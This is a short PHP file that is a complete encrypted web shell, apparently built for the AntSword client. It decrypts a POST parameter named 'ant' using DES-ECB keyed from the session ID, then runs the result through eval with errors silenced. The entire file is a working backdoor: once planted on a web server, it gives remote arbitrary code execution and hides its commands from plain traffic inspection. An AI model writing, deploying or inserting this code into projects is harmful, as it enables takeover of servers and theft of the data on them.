<?php
function encrypt($mc_key, $encrypt){
    $passcrypt = mcrypt_encrypt(MCRYPT_DES, $mc_key, trim($encrypt), MCRYPT_MODE_ECB);
    $encode = base64_encode($passcrypt);
    return $encode;
}

function decrypt($mc_key, $decrypt) {
    $decoded = base64_decode(trim($decrypt));
    $decrypted = trim(mcrypt_decrypt(MCRYPT_DES, $mc_key, $decoded, MCRYPT_MODE_ECB));
    return $decrypted;
}

@session_start();
$pwd='ant';
$key=substr(str_pad(session_id(),8,'a'),0,8);
@eval(decrypt($key,$_POST[$pwd]));

?>